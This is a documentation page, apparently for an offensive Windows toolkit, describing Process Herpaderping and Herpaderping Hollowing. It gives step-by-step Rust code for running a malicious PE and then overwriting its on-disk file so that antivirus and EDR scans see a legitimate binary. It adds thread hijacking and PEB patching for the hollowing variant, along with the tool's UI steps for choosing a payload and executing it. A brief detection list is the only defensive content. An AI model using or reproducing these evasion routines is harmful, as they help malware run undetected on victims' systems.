import { Badge } from "@/components/ui/badge";
import { CodeBlock } from "@/components/code-block";
import { WarningBox } from "@/components/warning-box";

export default function HerpaderpiPage() {
  return (
    <div className="space-y-8">
      <div>
        <div className="flex items-center gap-3 mb-4">
          <h1 className="text-4xl font-bold">Herpaderping</h1>
          <Badge variant="outline">Ring 3</Badge>
        </div>
        <p className="text-lg text-muted-foreground">
          Process creation techniques where the on-disk file is replaced with legitimate 
          content after the image section is created.
        </p>
      </div>

      <WarningBox variant="danger" title="Advanced Evasion Technique">
        These techniques exploit the timing gap between section creation and file scanning. 
        Use only for authorized security research.
      </WarningBox>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Process Herpaderping</h2>
        <p className="text-muted-foreground">
          The original herpaderping technique creates a process from a malicious PE, then 
          <strong> overwrites the on-disk file</strong> with legitimate content before the 
          process starts. When AV/EDR scans the file, they see the legitimate PE.
        </p>
      </section>

      <section className="space-y-4">
        <h3 className="text-xl font-semibold">Herpaderping Algorithm</h3>
        <CodeBlock
          language="rust"
          filename="crates/misc/src/process/herpaderp.rs"
          code={`pub fn herpaderp_process(
    payload_pe: &str,     // Malicious PE to execute
    payload_args: &str,   // Optional command line arguments
    legit_pe: &str,       // Legitimate PE to overwrite with
) -> Result<(u32, u32), MiscError> {
    
    // 1. Read both PEs into memory
    let payload_bytes = std::fs::read(payload_pe)?;
    let legit_bytes = std::fs::read(legit_pe)?;
    
    // Note: legit PE should be larger than payload PE
    
    // 2. Create temp file with full sharing
    let temp_path = format!("{}\\HP_{}.tmp", temp_dir(), timestamp());
    let file_handle = CreateFileW(
        &temp_path,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
    )?;
    
    // 3. Write PAYLOAD PE to temp file
    WriteFile(file_handle, &payload_bytes)?;
    FlushFileBuffers(file_handle)?;
    SetEndOfFile(file_handle)?;
    
    // 4. Create SEC_IMAGE section from temp file (contains payload)
    let section_handle = NtCreateSection(
        SECTION_ALL_ACCESS,
        file_handle,
        SEC_IMAGE,
    )?;
    
    // 5. Create process from section
    let process_handle = NtCreateProcessEx(
        PROCESS_ALL_ACCESS,
        section_handle,
    )?;
    
    // === THE HERPADERP ===
    // 6. OVERWRITE temp file with LEGITIMATE PE
    //    AV/EDR will now see the legit PE when scanning!
    SetFilePointerEx(file_handle, 0, FILE_BEGIN)?;
    WriteFile(file_handle, &legit_bytes)?;
    FlushFileBuffers(file_handle)?;
    SetEndOfFile(file_handle)?;  // Truncate/extend to legit size
    
    // 7. Close file handle (scanning happens here)
    CloseHandle(file_handle);
    
    // 8. Set up process parameters (PEB, environment, command line)
    setup_process_parameters(process_handle, &temp_path, payload_args)?;
    
    // 9. Create initial thread at payload entry point
    let thread_handle = NtCreateThreadEx(
        process_handle,
        payload_entry_point,
    )?;
    
    Ok((pid, tid))
}`}
        />
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Herpaderping Hollowing</h2>
        <p className="text-muted-foreground">
          Combines herpaderping with hollowing: the &quot;herpaderped&quot; section is mapped into a 
          legitimate suspended process instead of creating a new process from the section.
        </p>
      </section>

      <section className="space-y-4">
        <h3 className="text-xl font-semibold">Herpaderping Hollowing Algorithm</h3>
        <CodeBlock
          language="rust"
          filename="crates/misc/src/process/herpaderp_hollow.rs"
          code={`pub fn herpaderp_hollow_process(
    payload_pe: &str,   // Malicious PE payload
    legit_pe: &str,     // Serves as BOTH host process AND disk overwrite
) -> Result<(u32, u32), MiscError> {
    
    // 1. Read payload PE
    let payload_bytes = std::fs::read(payload_pe)?;
    
    // 2. Create temp file, write payload, create section (same as herpaderping)
    let temp_path = format!("{}\\HPH_{}.tmp", temp_dir(), timestamp());
    // ... write payload_bytes, create SEC_IMAGE section ...
    
    // 3. Create LEGITIMATE process SUSPENDED (using legit_pe as host)
    let (process_handle, thread_handle, pid, tid) = CreateProcessW(
        legit_pe,
        CREATE_SUSPENDED,
    )?;
    
    // 4. Map the herpaderped section into suspended process
    let mapped_base = NtMapViewOfSection(
        section_handle,
        process_handle,
    )?;
    
    // === THE HERPADERP ===
    // 5. OVERWRITE temp file with legit PE content
    let legit_bytes = std::fs::read(legit_pe)?;
    SetFilePointerEx(file_handle, 0, FILE_BEGIN)?;
    WriteFile(file_handle, &legit_bytes)?;
    // ... close file handle ...
    
    // 6. Hijack thread: point RCX to mapped payload entry
    let context = GetThreadContext(thread_handle)?;
    context.Rcx = mapped_base + payload_entry_rva;
    SetThreadContext(thread_handle, &context)?;
    
    // 7. Patch PEB.ImageBase
    NtWriteVirtualMemory(
        process_handle,
        peb_image_base_addr,
        &mapped_base,
    )?;
    
    // 8. Resume thread - payload executes inside legit process!
    ResumeThread(thread_handle)?;
    
    Ok((pid, tid))
}`}
        />
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Comparison</h2>
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-border">
                <th className="text-left py-2 px-3 font-semibold">Aspect</th>
                <th className="text-left py-2 px-3 font-semibold">Herpaderping</th>
                <th className="text-left py-2 px-3 font-semibold">Herpaderping Hollowing</th>
              </tr>
            </thead>
            <tbody>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3">Process Name</td>
                <td className="py-2 px-3 text-muted-foreground">Temp file name</td>
                <td className="py-2 px-3 text-muted-foreground">Legitimate process</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3">File on Disk</td>
                <td className="py-2 px-3 text-muted-foreground">Yes (shows legit PE)</td>
                <td className="py-2 px-3 text-muted-foreground">Yes (shows legit PE)</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3">Host Process</td>
                <td className="py-2 px-3 text-muted-foreground">New process</td>
                <td className="py-2 px-3 text-muted-foreground">Existing legit process</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3">Command Line Args</td>
                <td className="py-2 px-3 text-muted-foreground">Supported</td>
                <td className="py-2 px-3 text-muted-foreground">Inherited from host</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3">Stealth Level</td>
                <td className="py-2 px-3 text-muted-foreground">High</td>
                <td className="py-2 px-3 text-muted-foreground">Very High</td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Why It Works</h2>
        <div className="grid gap-4">
          <div className="p-4 rounded-lg border border-blue-500/30 bg-blue-500/10">
            <h3 className="font-semibold text-blue-400 mb-2">Timing Exploitation</h3>
            <p className="text-sm text-muted-foreground">
              The image section is created from the payload PE, then the file content changes. 
              The running process uses the original (payload) section data, but disk scanners 
              see the new (legitimate) content.
            </p>
          </div>
          <div className="p-4 rounded-lg border border-blue-500/30 bg-blue-500/10">
            <h3 className="font-semibold text-blue-400 mb-2">Section Caching</h3>
            <p className="text-sm text-muted-foreground">
              Windows caches the image section at creation time. Changes to the underlying 
              file don&apos;t affect the already-created section — it&apos;s a copy-on-write snapshot.
            </p>
          </div>
        </div>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Requirements</h2>
        <ul className="space-y-2 text-muted-foreground">
          <li>• <strong>64-bit payload</strong> — Only x64 PE files supported</li>
          <li>• <strong>Legit PE larger than payload</strong> — The overwriting PE should be at least as large</li>
          <li>• <strong>Admin privileges</strong> — Required for NT API process creation</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">UI Access</h2>
        <p className="text-muted-foreground">
          Access via Utilities tab → Herpaderping section:
        </p>
        <ul className="space-y-2 text-muted-foreground">
          <li>• <strong>Technique selector</strong> — Choose &quot;Herpaderping&quot; or &quot;Herpaderping Hollowing&quot;</li>
          <li>• <strong>PE Payload picker</strong> — Select 64-bit payload to execute</li>
          <li>• <strong>Command arguments</strong> — Optional args for herpaderping (not hollowing)</li>
          <li>• <strong>Legitimate Image picker</strong> — Select PE for disk overwrite (and host in hollowing mode)</li>
          <li>• <strong>Execute button</strong> — Performs the selected technique</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Detection</h2>
        <p className="text-muted-foreground">
          These techniques can be detected by:
        </p>
        <ul className="space-y-2 text-muted-foreground">
          <li>• Monitoring file writes after <code>NtCreateSection</code></li>
          <li>• Comparing image section hash to file hash at process start</li>
          <li>• ETW tracing section creation followed by file modification</li>
          <li>• Memory forensics comparing mapped image to disk file</li>
          <li>• Detecting <code>NtMapViewOfSection</code> of foreign sections into processes</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Related Techniques</h2>
        <ul className="space-y-2 text-muted-foreground">
          <li>• <a href="/docs/usermode/process-creation" className="text-violet hover:underline">Process Creation</a> — All 7 process creation methods</li>
          <li>• <a href="/docs/utilities/ghostly-hollowing" className="text-violet hover:underline">Ghostly Hollowing</a> — Ghost + hollow combination</li>
        </ul>
      </section>
    </div>
  );
}
